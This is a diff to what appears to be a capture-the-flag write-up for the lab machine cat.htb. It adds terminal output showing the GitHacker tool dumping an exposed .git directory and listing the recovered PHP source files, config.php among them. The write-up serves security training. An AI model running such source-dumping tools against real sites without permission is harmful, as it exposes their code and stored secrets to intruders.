@@ -160,6 +160,18 @@ committer Axel <axel2017@gmail.com> 1725146774 +0000
 Cat v1
 ```
 
+```
+(myenv) Hexada@hexada ~/app/pentesting-tools/GitHacker$ githacker --url http://cat.htb/.git/ --output-folder /home/Hexada/app/vrm/cat.htb/git                                   2 ↵ master 
+2025-04-27 10:15:42 INFO 1 urls to be exploited
+2025-04-27 10:15:42 INFO Exploiting http://cat.htb/.git/ into /home/Hexada/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d
+2025-04-27 10:15:43 INFO Downloading basic files...
+```
+
+```
+(myenv) Hexada@hexada ~/app/vrm/cat.htb/git/cbd584a870bc23c228bfffe42f75330d$ ls                                                                                                    master 
+accept_cat.php  admin.php  config.php  contest.php  css  delete_cat.php  img  img_winners  index.php  join.php  logout.php  view_cat.php  vote.php  winners  winners.php
+```
+
 
 
 
